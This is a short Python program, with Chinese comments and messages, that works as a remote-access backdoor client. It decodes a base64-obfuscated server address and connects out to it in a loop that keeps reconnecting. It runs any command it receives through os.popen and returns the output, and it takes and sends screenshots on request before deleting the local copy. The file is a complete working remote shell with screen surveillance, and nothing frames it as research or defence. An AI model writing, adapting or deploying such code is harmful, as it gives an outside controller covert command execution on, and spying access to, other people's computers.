import os
import socket
import time
import base64
from PyQt5.QtWidgets import QApplication
import sys

def take_screenshot():
    app = QApplication(sys.argv)
    screen = QApplication.primaryScreen()
    img = screen.grabWindow(0).toImage()
    img_path = "screenshot.jpg"
    img.save(img_path)
    app.quit()
    return img_path

def start_client(encoded_ip, encoded_port):
    server_ip = base64.b64decode(encoded_ip).decode()
    server_port = int(base64.b64decode(encoded_port).decode())

    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.connect((server_ip, server_port))
                connected = True
                print(f"已连接到服务器 {server_ip}:{server_port}")
            except ConnectionRefusedError:
                connected = False

            while connected:
                try:
                    data = s.recv(100000).decode()
                    if not data:
                        connected = False
                        break
                    
                    if data == "截图":
                        # 执行截图并发送
                        img_path = take_screenshot()
                        img_size = os.path.getsize(img_path)

                        # 发送图片大小
                        s.sendall(str(img_size).encode())

                        # 逐块发送图片数据
                        with open(img_path, "rb") as f:
                            while chunk := f.read(100000):  # 逐块读取并发送
                                s.sendall(chunk)

                        print("截图已发送给服务器")

                        # 删除本地的截图文件
                        os.remove(img_path)
                        print(f"已删除本地的截图文件: {img_path}")

                    else:
                        # 执行其他命令
                        result = os.popen(data).read()
                        message = result if result else '返回值为空'
                        s.sendall(message.encode())
                        
                except (ConnectionResetError, BrokenPipeError):
                    connected = False
                    break

            if not connected:
                print("重新连接服务器...")
                time.sleep(5)
